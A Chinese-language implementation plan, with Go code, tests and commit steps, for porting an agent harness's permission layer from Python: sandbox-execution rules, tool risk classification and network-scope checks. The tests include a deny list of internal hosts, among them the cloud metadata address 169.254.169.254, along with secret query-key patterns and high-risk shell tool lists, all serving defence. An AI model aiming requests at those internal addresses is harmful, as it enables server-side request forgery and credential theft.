- Create: `internal/swarm/agents/harness/common/rails/permissions/native_path_context.go`
- Create: `internal/swarm/agents/harness/common/rails/permissions/network_scope.go`
- Create: 四个对应的 `_test.go`
- Read: 四个 Python 源文件

> **四个文件完全无内部依赖，可并行或按任意顺序实现。每个文件一提交。**

- [ ] **Step 1: `execution_provider_contract.go`（37 行）**

```go
package permissions

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// jiuwenboxSandboxExecutionTools 必须在 JiuwenBox 沙箱内执行的工具
	jiuwenboxSandboxExecutionTools = map[string]struct{}{
		"bash": {}, "mcp_exec_command": {}, "code": {},
	}
	// acpIDEExecutionTools ACP IDE 提供的执行工具
	acpIDEExecutionTools = map[string]struct{}{"create_terminal": {}}
	// unknownProviderExecutionTools 执行提供方未知的工具
	unknownProviderExecutionTools = map[string]struct{}{"cmd": {}, "powershell": {}}
)

// ──────────────────────────── 常量 ────────────────────────────

// executionProviderContractUnverified 执行提供方契约未验证的标记
const executionProviderContractUnverified = "execution_provider_contract_unverified"

// ──────────────────────────── 导出函数 ────────────────────────────

// RequiresNoHostFallback 自动执行是否必须留在 JiuwenBox 内。
//
// Python: requires_no_host_fallback(tool_name, *, tool_category)
func RequiresNoHostFallback(toolName, toolCategory string) bool {
	if toolCategory != "shell" && toolCategory != "code" {
		return false
	}
	_, hit := jiuwenboxSandboxExecutionTools[toolName]
	return hit
}

// RequiresManualExecutionProviderReview 宿主是否无法验证自动执行契约。
//
// Python: requires_manual_execution_provider_review(tool_name, *, tool_category)
func RequiresManualExecutionProviderReview(toolName, toolCategory string) bool {
	if toolCategory != "shell" && toolCategory != "code" {
		return false
	}
	_, hit := jiuwenboxSandboxExecutionTools[toolName]
	return !hit
}
```

测试：

```go
// TestRequiresNoHostFallback 测试 shell/code 类的 JiuwenBox 工具返回 true
func TestRequiresNoHostFallback(t *testing.T) {
	cases := []struct {
		tool, category string
		want           bool
	}{
		{"bash", "shell", true},
		{"mcp_exec_command", "shell", true},
		{"code", "code", true},
		{"create_terminal", "shell", false},
		{"cmd", "shell", false},
		{"bash", "path", false},
		{"bash", "unknown", false},
	}
	for _, c := range cases {
		if got := RequiresNoHostFallback(c.tool, c.category); got != c.want {
			t.Errorf("RequiresNoHostFallback(%q, %q) = %v, want %v", c.tool, c.category, got, c.want)
		}
	}
}

// TestRequiresManualExecutionProviderReview 测试非 JiuwenBox 的 shell/code 工具需人工审查
func TestRequiresManualExecutionProviderReview(t *testing.T) {
	cases := []struct {
		tool, category string
		want           bool
	}{
		{"bash", "shell", false},
		{"create_terminal", "shell", true},
		{"cmd", "shell", true},
		{"powershell", "shell", true},
		{"bash", "path", false},
	}
	for _, c := range cases {
		if got := RequiresManualExecutionProviderReview(c.tool, c.category); got != c.want {
			t.Errorf("RequiresManualExecutionProviderReview(%q, %q) = %v, want %v", c.tool, c.category, got, c.want)
		}
	}
}
```

- [ ] **Step 2: `sandbox_profile.go`（48 行）**

```go
// SandboxDescriptor 当前沙箱操作暴露的解析根目录。
//
// Python: @dataclass(frozen=True, slots=True) SandboxDescriptor
type SandboxDescriptor struct {
	// ExecutionWorkspaceRoot 执行工作空间根
	ExecutionWorkspaceRoot string
	// PythonPackageVenvRoot Python 包虚拟环境根
	PythonPackageVenvRoot string
}

// BuildSandboxProfile 从 sys_operation 提取解析根，不解释沙箱能力。
//
// Python: build_sandbox_profile(sys_operation=None)
func BuildSandboxProfile(sysOperation any) SandboxDescriptor {
	if sysOperation == nil {
		return SandboxDescriptor{}
	}
	return SandboxDescriptor{
		ExecutionWorkspaceRoot: rawStringAttr(sysOperation, "sandbox_execution_workspace_root"),
		PythonPackageVenvRoot:  rawStringAttr(sysOperation, "sandbox_python_package_venv_root"),
	}
}

// rawStringAttr 取字符串属性并裁剪；非字符串或空白返回空串。
//
// Python: _raw_string_attr(source, name)
func rawStringAttr(source any, name string) string {
	value := valueGet(source, name)
	s, ok := value.(string)
	if !ok {
		return ""
	}
	normalized := strings.TrimSpace(s)
	return normalized
}

// valueGet 从 map 或 struct 取字段；source 为 nil 返回 nil。
//
// Python: _value_get(source, name)
func valueGet(source any, name string) any {
	if source == nil {
		return nil
	}
	// map 形态：直接按 snake_case 键取
	if m, ok := source.(map[string]any); ok {
		return m[name]
	}
	// struct 形态：反射按字段名或 json tag 匹配
	v := reflect.ValueOf(source)
	if v.Kind() == reflect.Ptr {
		if v.IsNil() {
			return nil
		}
		v = v.Elem()
	}
	if v.Kind() != reflect.Struct {
		return nil
	}
	t := v.Type()
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		if field.PkgPath != "" {
			continue // 非导出字段跳过
		}
		if field.Name == name {
			return v.Field(i).Interface()
		}
		if tag := field.Tag.Get("json"); tag != "" {
			if idx := strings.Index(tag, ","); idx >= 0 {
				tag = tag[:idx]
			}
			if tag == name {
				return v.Field(i).Interface()
			}
		}
	}
	return nil
}
```

测试：

```go
// TestBuildSandboxProfile_三种形态 测试 nil / map / struct 三种输入
func TestBuildSandboxProfile_三种形态(t *testing.T) {
	// nil
	if got := BuildSandboxProfile(nil); got != (SandboxDescriptor{}) {
		t.Errorf("nil 应返回空描述符，got %+v", got)
	}
	// map
	got := BuildSandboxProfile(map[string]any{
		"sandbox_execution_workspace_root": "/ws",
		"sandbox_python_package_venv_root": "/venv",
	})
	if got.ExecutionWorkspaceRoot != "/ws" || got.PythonPackageVenvRoot != "/venv" {
		t.Errorf("map 形态 = %+v", got)
	}
	// struct
	type fakeSysOp struct {
		Root string `json:"sandbox_execution_workspace_root"`
	}
	got2 := BuildSandboxProfile(fakeSysOp{Root: "/s"})
	if got2.ExecutionWorkspaceRoot != "/s" {
		t.Errorf("struct 形态 ExecutionWorkspaceRoot = %q, want /s", got2.ExecutionWorkspaceRoot)
	}
}

// TestBuildSandboxProfile_空白与非字符串回落 测试空白与非字符串返回空
func TestBuildSandboxProfile_空白与非字符串回落(t *testing.T) {
	got := BuildSandboxProfile(map[string]any{
		"sandbox_execution_workspace_root": "   ",
		"sandbox_python_package_venv_root": 123,
	})
	if got.ExecutionWorkspaceRoot != "" {
		t.Errorf("空白应回落空串，got %q", got.ExecutionWorkspaceRoot)
	}
	if got.PythonPackageVenvRoot != "" {
		t.Errorf("非字符串应回落空串，got %q", got.PythonPackageVenvRoot)
	}
}
```

- [ ] **Step 3: `native_path_context.go`（65 行）**

按 spec §3.15 实现。**关键：`NativeArgumentsJSON` 必须手写 ASCII 转义**（Python `ensure_ascii=True`）：

```go
// NativeArgumentsJSON 把参数序列化为稳定的 JSON 字符串。
//
// 语义对齐 Python json.dumps(dict(args), sort_keys=True, ensure_ascii=True,
// allow_nan=False)：
//   - sort_keys：Go 的 json.Marshal 对 map 自动按 key 排序
//   - ensure_ascii：Go 默认输出 UTF-8，需手工转义非 ASCII 为 \uXXXX
//   - allow_nan=False：json.Marshal 对 NaN/Inf 返回错误，一致
//
// 字符串比较依赖此函数与 Python 产出一致，漏了 ensure_ascii 会导致
// CurrentNativePathAccess 永远返回 nil。
//
// Python: native_arguments_json(args)
func NativeArgumentsJSON(args map[string]any) string {
	raw, err := json.Marshal(args)
	if err != nil {
		return ""
	}
	return escapeNonASCII(string(raw))
}

// escapeNonASCII 把 JSON 文本里的非 ASCII 字符转义为 \uXXXX（UTF-16 代理对）。
//
// Python 的 ensure_ascii=True 对 BMP 外字符输出代理对形式，Go 需一致。
func escapeNonASCII(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		if r < 0x80 {
			b.WriteRune(r)
			continue
		}
		if r > 0xFFFF {
			// 代理对
			r -= 0x10000
			high := 0xD800 + (r >> 10)
			low := 0xDC00 + (r & 0x3FF)
			b.WriteString(fmt.Sprintf(`\u%04x\u%04x`, high, low))
			continue
		}
		b.WriteString(fmt.Sprintf(`\u%04x`, r))
	}
	return b.String()
}
```

测试必须断言中文与 emoji 的转义结果：

```go
// TestNativeArgumentsJSON_ensureAscii 测试非 ASCII 字符被转义
func TestNativeArgumentsJSON_ensureAscii(t *testing.T) {
	got := NativeArgumentsJSON(map[string]any{"path": "中文"})
	want := `{"path":"\u4e2d\u6587"}`
	if got != want {
		t.Errorf("NativeArgumentsJSON = %s, want %s", got, want)
	}
}

// TestNativeArgumentsJSON_emoji代理对 测试 BMP 外字符用代理对
func TestNativeArgumentsJSON_emoji代理对(t *testing.T) {
	got := NativeArgumentsJSON(map[string]any{"x": "😀"})
	// U+1F600 → \ud83d\ude00
	want := `{"x":"\ud83d\ude00"}`
	if got != want {
		t.Errorf("NativeArgumentsJSON = %s, want %s", got, want)
	}
}

// TestNativeArgumentsJSON_键排序 测试 key 按字典序
func TestNativeArgumentsJSON_键排序(t *testing.T) {
	got := NativeArgumentsJSON(map[string]any{"b": 1, "a": 2})
	want := `{"a":2,"b":1}`
	if got != want {
		t.Errorf("NativeArgumentsJSON = %s, want %s", got, want)
	}
}
```

验证方式：用 Python 跑同样的输入确认期望值。

```bash
python3 -c "import json; print(json.dumps({'path':'中文'}, sort_keys=True, ensure_ascii=True, allow_nan=False))"
python3 -c "import json; print(json.dumps({'x':'😀'}, sort_keys=True, ensure_ascii=True, allow_nan=False))"
```

- [ ] **Step 4: `network_scope.go`（175 行）**

按 spec §3.12 实现。**两处 Go 无标准库等价物**：

1. **`ipaddress.is_global`** —— 必须按 CPython 语义手写：

```go
// isGlobal 判定 IP 是否为全局可路由地址（对齐 Python ipaddress.is_global）。
//
// CPython 的 is_global 定义（IPv4）：不是 private、不是 loopback、不是
// link-local、不是 multicast、不是 reserved、不是 unspecified、不在
// 100.64.0.0/10（共享地址）。
// IPv6：不是 private（fc00::/7）、不是 loopback（::1）、不是 link-local
// （fe80::/10）、不是 multicast（ff00::/8）、不是 reserved、不是
// unspecified（::）、不是 IPv4-mapped 的内网地址。
//
// 逐条照抄 CPython 的 ipaddress.py 实现，不要用近似判断。
//
// CPython 的 IPv4 is_global 判据（_private_networks 取反 + 额外排除）：
//   not in 0.0.0.0/8, 10/8, 127/8, 169.254/16, 172.16/12, 192.0.0/29,
//   192.0.2/24, 192.88.99/24, 192.168/16, 198.18/15, 198.51.100/24,
//   203.0.113/24, 224/4(multicast), 240/4(reserved), 255.255.255.255/32
//   且 not in 100.64.0.0/10（共享地址，CPython 单列）
//
// IPv6 的 is_global：not in ::/128, ::1/128, ::ffff:0:0/96（IPv4-mapped 需看内层）,
//   64:ff9b::/96, 100::/64, 2001::/23（含 Teredo/ORCHID/等）, 2001:db8::/32,
//   fc00::/7, fe80::/10, ff00::/8
func isGlobal(addr netip.Addr) bool {
	if !addr.IsValid() {
		return false
	}
	if addr.Is4() {
		return isGlobalIPv4(addr)
	}
	if addr.Is4In6() {
		// IPv4-mapped：看内层地址
		return isGlobalIPv4(addr.Unmap())
	}
	return isGlobalIPv6(addr)
}

// isGlobalIPv4 判定 IPv4 是否全局可路由。
func isGlobalIPv4(addr netip.Addr) bool {
	b := addr.As4()
	// 0.0.0.0/8（"本网络"）
	if b[0] == 0 {
		return false
	}
	// 10.0.0.0/8
	if b[0] == 10 {
		return false
	}
	// 100.64.0.0/10（共享地址，CGN）
	if b[0] == 100 && b[1] >= 64 && b[1] <= 127 {
		return false
	}
	// 127.0.0.0/8
	if b[0] == 127 {
		return false
	}
	// 169.254.0.0/16（link-local）
	if b[0] == 169 && b[1] == 254 {
		return false
	}
	// 172.16.0.0/12
	if b[0] == 172 && b[1] >= 16 && b[1] <= 31 {
		return false
	}
	// 192.0.0.0/29
	if b[0] == 192 && b[1] == 0 && b[2] == 0 && b[3] <= 7 {
		return false
	}
	// 192.0.2.0/24（TEST-NET-1）
	if b[0] == 192 && b[1] == 0 && b[2] == 2 {
		return false
	}
	// 192.88.99.0/24（6to4 relay anycast，已废弃）
	if b[0] == 192 && b[1] == 88 && b[2] == 99 {
		return false
	}
	// 192.168.0.0/16
	if b[0] == 192 && b[1] == 168 {
		return false
	}
	// 198.18.0.0/15（benchmark）
	if b[0] == 198 && (b[1] == 18 || b[1] == 19) {
		return false
	}
	// 198.51.100.0/24（TEST-NET-2）
	if b[0] == 198 && b[1] == 51 && b[2] == 100 {
		return false
	}
	// 203.0.113.0/24（TEST-NET-3）
	if b[0] == 203 && b[1] == 0 && b[2] == 113 {
		return false
	}
	// 224.0.0.0/4（multicast）
	if b[0] >= 224 && b[0] <= 239 {
		return false
	}
	// 240.0.0.0/4（reserved），含 255.255.255.255
	if b[0] >= 240 {
		return false
	}
	return true
}

// isGlobalIPv6 判定 IPv6 是否全局可路由。
func isGlobalIPv6(addr netip.Addr) bool {
	b := addr.As16()

	// ::/128（unspecified）
	allZero := true
	for _, v := range b {
		if v != 0 {
			allZero = false
			break
		}
	}
	if allZero {
		return false
	}
	// ::1/128（loopback）
	loopback := b[15] == 1
	for i := 0; i < 15; i++ {
		if b[i] != 0 {
			loopback = false
			break
		}
	}
	if loopback {
		return false
	}
	// ::ffff:0:0/96（IPv4-mapped，内层已在调用方 Unmap 处理，这里兜底）
	if b[0] == 0 && b[1] == 0 && b[2] == 0 && b[3] == 0 && b[4] == 0 &&
		b[5] == 0 && b[6] == 0 && b[7] == 0 && b[8] == 0 && b[9] == 0 && b[10] == 0xff && b[11] == 0xff {
		return false
	}
	// 64:ff9b::/96（NAT64）
	if b[0] == 0 && b[1] == 0x64 && b[2] == 0xff && b[3] == 0x9b &&
		b[4] == 0 && b[5] == 0 && b[6] == 0 && b[7] == 0 &&
		b[8] == 0 && b[9] == 0 && b[10] == 0 && b[11] == 0 {
		return false
	}
	// 100::/64（discard-only）
	if b[0] == 0x01 && b[1] == 0x00 &&
		b[2] == 0 && b[3] == 0 && b[4] == 0 && b[5] == 0 && b[6] == 0 && b[7] == 0 {
		return false
	}
	// 2001::/23（协议分配，含 Teredo 2001::/32、ORCHID 2001:10::/28）
	if b[0] == 0x20 && b[1] == 0x01 && b[2] < 0x02 {
		return false
	}
	// 2001:db8::/32（文档）
	if b[0] == 0x20 && b[1] == 0x01 && b[2] == 0x0d && b[3] == 0xb8 {
		return false
	}
	// fc00::/7（unique local）
	if (b[0] & 0xfe) == 0xfc {
		return false
	}
	// fe80::/10（link-local）
	if b[0] == 0xfe && (b[1]&0xc0) == 0x80 {
		return false
	}
	// ff00::/8（multicast）
	if b[0] == 0xff {
		return false
	}
	return true
}
```

2. **IDNA 编码** —— 用 `golang.org/x/net/idna`：

```bash
cd /home/opensource/uapclaw-gateway
grep -n "golang.org/x/net" go.mod
```

若已引入则直接用；否则：

```bash
GOPROXY=https://goproxy.cn,direct go get golang.org/x/net
```

```go
// toASCIIDomain 把 Unicode 域名转为 ASCII（IDNA2003 风格，对齐 Python
// str.encode("idna")）。
//
// 注意：Python 的 "idna" 编解码器是 IDNA2003（ToASCII with UseSTD3Rules），
// 不是 IDNA2008 的 Lookup profile。用 idna.ToASCII 而非 idna.Lookup.ToASCII。
func toASCIIDomain(s string) (string, bool) {
	out, err := idna.ToASCII(s)
	if err != nil {
		return "", false
	}
	return strings.ToLower(out), true
}
```

3. **`parse_qsl(keep_blank_values=True)`** —— Go `url.ParseQuery` 语义不同（不保序、错误即整段丢弃），需手写：

```go
// parseQueryPairs 解析查询串为有序键值对，保留空值。
//
// 对齐 Python urllib.parse.parse_qsl(query, keep_blank_values=True)：
//   - 保留原始顺序
//   - 保留空值（`a=&b=1` 产出 ("a",""),("b","1")）
//   - 无 `=` 的段产出 (key, "")
//   - 单项解码错误只影响该项，不整段丢弃
func parseQueryPairs(query string) [][2]string {
	out := make([][2]string, 0, 8)
	if query == "" {
		return out
	}
	for _, segment := range strings.Split(query, "&") {
		if segment == "" {
			continue
		}
		key, value, hasEq := strings.Cut(segment, "=")
		decodedKey, errKey := url.QueryUnescape(key)
		if errKey != nil {
			// 单项解码失败只影响该项，保留原始文本
			decodedKey = key
		}
		decodedValue := ""
		if hasEq {
			if v, err := url.QueryUnescape(value); err == nil {
				decodedValue = v
			} else {
				decodedValue = value
			}
		}
		out = append(out, [2]string{decodedKey, decodedValue})
	}
	return out
}
```

4. **`isSecretQueryKey` 的驼峰切分** —— `re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", rawKey)` 是反向引用，RE2 **支持反向引用吗？不支持**。

```go
// snakeCase 把驼峰键切成下划线形式（对齐 Python re.sub(r"([a-z0-9])([A-Z])", r"\1_\2")）。
//
// Go 的 regexp 不支持反向引用，手动遍历实现。
func snakeCase(s string) string {
	var b strings.Builder
	b.Grow(len(s) + 4)
	for i := 0; i < len(s); i++ {
		b.WriteByte(s[i])
		if i+1 < len(s) && isLowerOrDigit(s[i]) && isUpper(s[i+1]) {
			b.WriteByte('_')
		}
	}
	return b.String()
}
```

测试：

```go
// TestIsSecretQueryKey_驼峰切分 测试驼峰键被识别为密钥
func TestIsSecretQueryKey_驼峰切分(t *testing.T) {
	secret := []string{
		"accessToken", "apiKey", "clientSecret", "authToken",
		"privateKey", "sessionId", "bearerToken", "idToken",
	}
	for _, k := range secret {
		if !isSecretQueryKey(k) {
			t.Errorf("isSecretQueryKey(%q) = false, want true", k)
		}
	}
	notSecret := []string{"name", "id", "page", "query", "q"}
	for _, k := range notSecret {
		if isSecretQueryKey(k) {
			t.Errorf("isSecretQueryKey(%q) = true, want false", k)
		}
	}
}

// TestNormalizeNetworkHost 测试 host 归一化
func TestNormalizeNetworkHost(t *testing.T) {
	cases := []struct{ in, want string }{
		{"  Example.COM.  ", "example.com"},
		{"[::1]", "::1"},
		{"127.0.0.1", "127.0.0.1"},
		{"::0:1", "::1"},
		{"", ""},
		{"例子.中国", "xn--fsqu00a.xn--fiqs8s"},
	}
	for _, c := range cases {
		if got := NormalizeNetworkHost(c.in); got != c.want {
			t.Errorf("NormalizeNetworkHost(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestNetworkHostRejectionReason 测试拒绝原因
func TestNetworkHostRejectionReason(t *testing.T) {
	cases := []struct{ host, want string }{
		{"", "network_host_missing"},
		{"localhost", "network_single_label_host"},
		{"com", "network_public_suffix_host"},
		{"127.0.0.1", "network_host_not_public"},
		{"10.0.0.1", "network_host_not_public"},
		{"169.254.169.254", "network_host_not_public"},
		{"192.168.1.1", "network_host_not_public"},
		{"100.64.0.1", "network_host_not_public"},
		{"example.com", ""},
		{"8.8.8.8", ""},
		{"2001:4860:4860::8888", ""},
	}
	for _, c := range cases {
		if got := NetworkHostRejectionReason(c.host); got != c.want {
			t.Errorf("NetworkHostRejectionReason(%q) = %q, want %q", c.host, got, c.want)
		}
	}
}
```

- [ ] **Step 5: 跑四个文件的测试 + 覆盖率**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/swarm/agents/harness/common/rails/permissions/ 2>&1 | tail -5
```

Expected: 全部 PASS，覆盖率 ≥ 85%。

- [ ] **Step 6: 分四次提交（每文件一提交）**

```bash
gofmt -l internal/swarm/agents/harness/common/rails/permissions/
P=internal/swarm/agents/harness/common/rails/permissions

git add $P/execution_provider_contract.go $P/execution_provider_contract_test.go
git commit -m "feat(permissions): 执行提供方契约（execution_provider_contract.py 37 行）

三个 frozenset + 两个判定函数。shell/code 类工具只有 bash /
mcp_exec_command / code 属 JiuwenBox 沙箱；其余（cmd / powershell /
create_terminal）需人工确认执行提供方。"
git show --stat HEAD

git add $P/sandbox_profile.go $P/sandbox_profile_test.go
git commit -m "feat(permissions): 沙箱根目录投影（sandbox_profile.py 48 行）

SandboxDescriptor 两字段（execution_workspace_root /
python_package_venv_root），从 sys_operation 提取，不解释沙箱能力。"
git show --stat HEAD

git add $P/native_path_context.go $P/native_path_context_test.go
git commit -m "feat(permissions): Smart 场景原生路径投影（native_path_context.py 65 行）

NativeArgumentsJSON 必须手写 ASCII 转义：Python 的 json.dumps 用
ensure_ascii=True，Go 的 json.Marshal 默认输出 UTF-8。字符串比较依赖
二者一致，漏了转义会让 CurrentNativePathAccess 恒返回 nil。"
git show --stat HEAD

git add $P/network_scope.go $P/network_scope_test.go
git commit -m "feat(permissions): 网络授权域判定原语（network_scope.py 175 行）

四处 Go 无标准库等价物，逐条自建：
- ipaddress.is_global 按 CPython 语义手写（无标准库函数）
- IDNA 用 golang.org/x/net/idna 的 ToASCII（对齐 Python 的 idna 编解码器）
- parse_qsl(keep_blank_values=True) 保序保空值，与 url.ParseQuery 不同
- 驼峰切分依赖反向引用，RE2 不支持，改手动遍历"
git show --stat HEAD
```

---

## Task 13：`permissions/tool_capabilities.go`

**Files:**
- Create: `internal/swarm/agents/harness/common/rails/permissions/tool_capabilities.go`
- Create: `internal/swarm/agents/harness/common/rails/permissions/tool_capabilities_test.go`
- Read: `/home/opensource/jiuwenswarm-develop/jiuwenswarm/agents/harness/common/rails/permissions/tool_capabilities.py`（615 行）

> **本任务是 9.90b 里最长的文件（615 行）。核心是 `classify_tool` 的 28 个分支，顺序不可调换。**

- [ ] **Step 1: 写失败测试——28 个分支的代表用例**

```go
// TestClassifyTool_分支代表用例 测试 28 个分类分支的代表工具
func TestClassifyTool_分支代表用例(t *testing.T) {
	cases := []struct {
		tool           string
		wantCategory   string
		wantFamily     string
		wantRisk       string
		wantHighFlex   bool
		wantFactsSrc   string
	}{
		// 分支 2：内部只读
		{"cron_list_jobs", "cron", "internal_readonly", "low", false, "host_static"},
		{"tool_search", "task_management", "internal_readonly", "low", false, "host_static"},
		// 分支 3：shell
		{"bash", "shell", "dynamic_execution", "high", true, "host_static"},
		{"mcp_exec_command", "shell", "dynamic_execution", "high", true, "host_static"},
		// 分支 4：code
		{"code", "code", "dynamic_execution", "high", true, "host_static"},
		// 分支 5：path 读
		{"read_file", "path", "workspace_read", "low", false, "host_static"},
		// 分支 5：path 写
		{"write_file", "path", "workspace_write", "medium", false, "host_static"},
		{"apply_patch", "path", "workspace_write", "medium", false, "host_static"},
		// 分支 6/7：网络
		{"mcp_free_search", "network", "public_search", "medium", false, "host_static"},
		{"mcp_fetch_webpage", "network", "public_web_read", "medium", false, "host_static"},
		// 分支 8/9：todo
		{"todo_create", "task_management", "task_state", "low", false, "host_static"},
		{"todo_insert", "task_management", "task_state", "medium", true, "name_classification_hint"},
		// 分支 10/11/12：session
		{"session_list", "task_management", "session_status", "low", false, "host_static"},
		{"session_send_message", "task_management", "cross_session_send", "high", true, "host_static"},
		{"session_message_resolve", "task_management", "cross_session_resolution", "high", true, "host_static"},
		// 分支 13：interaction
		{"ask_user", "interaction", "ask_user", "low", false, "host_static"},
		// 分支 14：cron 变更
		{"cron_create_job", "cron", "schedule_change", "high", true, "name_classification_hint"},
		// 分支 16：subagent
		{"task_tool", "subagent", "subagent_control", "high", true, "host_static"},
		{"spawn_sub_agent", "subagent", "subagent_control", "high", true, "name_classification_hint"},
		// 分支 17：browser 固定
		{"browser_phase", "browser", "browser_session_observe", "low", false, "host_static"},
		{"browser_recall_offload", "browser", "browser_session_recall", "low", false, "host_static"},
		// 分支 18：browser 动态
		{"browser_click", "browser", "browser_action", "high", true, "name_classification_hint"},
		// 分支 19/20/21：skill
		{"search_skill", "skill", "skill_discovery", "medium", false, "host_static"},
		{"skill_tool", "skill", "skill_read", "low", false, "host_static"},
		{"install_skill", "skill", "skill_change", "high", true, "host_static"},
		// 分支 22/23：外部发送与设备
		{"send_file_to_user", "external_send", "external_send", "high", true, "host_static"},
		{"call_phone", "device", "device_action", "high", true, "host_static"},
		// 分支 24/25/26：memory
		{"write_memory", "memory", "memory_write", "high", true, "host_static"},
		{"memory_get", "memory", "memory_read", "low", false, "host_static"},
		{"memory_search", "memory", "memory_search", "low", false, "host_static"},
		{"ltm_search", "memory", "memory_search", "medium", true, "name_classification_hint"},
		// 分支 27：未知 mcp
		{"mcp_unknown_thing", "mcp", "unknown_mcp", "high", true, "name_classification_hint"},
		// 分支 28：兜底
		{"totally_unknown_tool", "unknown", "unknown", "high", true, "name_classification_hint"},
	}
	for _, c := range cases {
		t.Run(c.tool, func(t *testing.T) {
			got := ClassifyTool(c.tool)
			if got.Category != c.wantCategory {
				t.Errorf("Category = %q, want %q", got.Category, c.wantCategory)
			}
			if got.OperationFamily != c.wantFamily {
				t.Errorf("OperationFamily = %q, want %q", got.OperationFamily, c.wantFamily)
			}
			if got.RiskTier != c.wantRisk {
				t.Errorf("RiskTier = %q, want %q", got.RiskTier, c.wantRisk)
			}
			if got.HighFlex != c.wantHighFlex {
				t.Errorf("HighFlex = %v, want %v", got.HighFlex, c.wantHighFlex)
			}
			if got.FactsSource != c.wantFactsSrc {
				t.Errorf("FactsSource = %q, want %q", got.FactsSource, c.wantFactsSrc)
			}
		})
	}
}

// TestClassifyTool_分支顺序_cron只读优先 测试 cron_list_jobs 走内部只读而非 cron 分支
func TestClassifyTool_分支顺序_cron只读优先(t *testing.T) {
	got := ClassifyTool("cron_list_jobs")
	if got.RiskTier != "low" {
		t.Errorf("RiskTier = %q, want low（branch 2 先于 branch 14）", got.RiskTier)
	}
	if got.OperationFamily != "internal_readonly" {
		t.Errorf("OperationFamily = %q, want internal_readonly", got.OperationFamily)
	}
}

// TestClassifyTool_display与redaction键 测试 display_key 与 redaction_key 的生成
func TestClassifyTool_display与redaction键(t *testing.T) {
	cases := []struct {
		tool        string
		wantDisplay string
		wantRedact  string
	}{
		{"bash", "tool.shell.dynamic_execution", "arguments_sensitive"},
		{"read_file", "tool.path.workspace_read", "resource_sensitive"},
		{"mcp_fetch_webpage", "tool.network.public_web_read", "network_sensitive"},
		{"mcp_unknown_x", "tool.mcp.unknown_mcp", "full_sensitive"},
		{"totally_unknown", "tool.unknown.unknown", "full_sensitive"},
		{"ask_user", "tool.interaction.ask_user", "default"},
	}
	for _, c := range cases {
		got := ClassifyTool(c.tool)
		if got.DisplayKey != c.wantDisplay {
			t.Errorf("%s: DisplayKey = %q, want %q", c.tool, got.DisplayKey, c.wantDisplay)
		}
		if got.RedactionKey != c.wantRedact {
			t.Errorf("%s: RedactionKey = %q, want %q", c.tool, got.RedactionKey, c.wantRedact)
		}
	}
}

// TestClassifyTool_别名冲突降级 测试 conflict 时降级为 unknown/high
func TestClassifyTool_别名冲突降级(t *testing.T) {
	// exec_command 在 staticCanonicalToolNames 里（因为它是别名键），
	// 若同时出现在 canonical_names 会触发 conflict
	got := ClassifyTool("exec_command")
	if got.AliasConflict {
		// 若实现允许 conflict，必须降级
		if got.Category != "unknown" || got.RiskTier != "high" {
			t.Errorf("conflict 时 Category=%q RiskTier=%q, want unknown/high", got.Category, got.RiskTier)
		}
		if got.FactsSource != "unknown" {
			t.Errorf("conflict 时 FactsSource = %q, want unknown", got.FactsSource)
		}
	}
}

// TestShellToolNames 测试 shell 工具名列表已排序
func TestShellToolNames(t *testing.T) {
	got := ShellToolNames()
	want := []string{"bash", "cmd", "create_terminal", "mcp_exec_command", "powershell"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("ShellToolNames() = %v, want %v", got, want)
	}
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/swarm/agents/harness/common/rails/permissions/ -run TestClassifyTool 2>&1 | head
```

Expected: `undefined: ClassifyTool`。

- [ ] **Step 3: 实现常量与集合（Python L17-227）**

```go
package permissions

import (
	"sort"
	"strings"

	"github.com/uapclaw/uapclaw-go/internal/common/permission_tools"
)

// ──────────────────────────── 结构体 ────────────────────────────

// ToolCapability 工具的安全相关能力事实（不可变）。
//
// 本值只描述「这个工具做什么」，**从不**用于直接授予权限。
//
// Python: @dataclass(frozen=True) ToolCapability
type ToolCapability struct {
	ToolName          string
	RegisteredName    string
	Aliases           []string
	Category          string
	OperationFamily   string
	ResourceClass     string
	StaticSideEffects []string
	RiskTier          string
	HighFlex          bool
	DisplayKey        string
	RedactionKey      string
	FactsSource       string
	FactsVersion      string
	AliasConflict     bool
}

// ──────────────────────────── 常量 ────────────────────────────

const (
	// ToolCapabilityFactsVersion 能力事实版本
	ToolCapabilityFactsVersion = "2"
	// HostStaticFacts 事实来自宿主静态表（权威）
	HostStaticFacts = "host_static"
	// NameClassificationHint 事实来自名字推断（非权威）
	NameClassificationHint = "name_classification_hint"
	// UnknownFacts 事实未知（fail-closed）
	UnknownFacts = "unknown"
)

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	shellTools = map[string]struct{}{
		"bash": {}, "cmd": {}, "powershell": {}, "mcp_exec_command": {}, "create_terminal": {},
	}
	codeTools    = map[string]struct{}{"code": {}}
	pathToolsSet = map[string]struct{}{
		"apply_patch": {}, "lsp": {}, "read_file": {}, "read_pdf": {},
		"write_file": {}, "edit_file": {}, "read_text_file": {}, "write_text_file": {},
		"write": {}, "read": {}, "glob_file_search": {}, "glob": {},
		"list_dir": {}, "list_files": {}, "grep": {}, "search_replace": {},
	}
	publicSearchTools  = map[string]struct{}{"mcp_free_search": {}, "mcp_paid_search": {}}
	publicWebReadTools = map[string]struct{}{"mcp_fetch_webpage": {}}
	subagentTools      = map[string]struct{}{"task_tool": {}, "spawn_sub_agent": {}, "session_new": {}}
	subagentRuntimeControlTools = map[string]struct{}{
		"subagent_close": {}, "subagent_list": {}, "subagent_resume": {},
		"subagent_send_input": {}, "subagent_spawn": {}, "subagent_wait": {},
	}
	hostTodoTools   = map[string]struct{}{"todo_create": {}, "todo_list": {}, "todo_get": {}, "todo_modify": {}}
	legacyTodoTools = map[string]struct{}{"todo_insert": {}, "todo_complete": {}, "todo_remove": {}}
	sessionStatusTools = map[string]struct{}{
		"session_list": {}, "session_message_list": {}, "session_read": {},
	}
	sessionSendTools             = map[string]struct{}{"session_send_message": {}}
	sessionMessageManagementTools = map[string]struct{}{
		"session_message_resolve": {}, "session_continue_queued": {},
	}
	internalReadonlyTools = map[string]struct{}{
		"cron_list_jobs": {}, "cron_get_job": {}, "cron_preview_job": {},
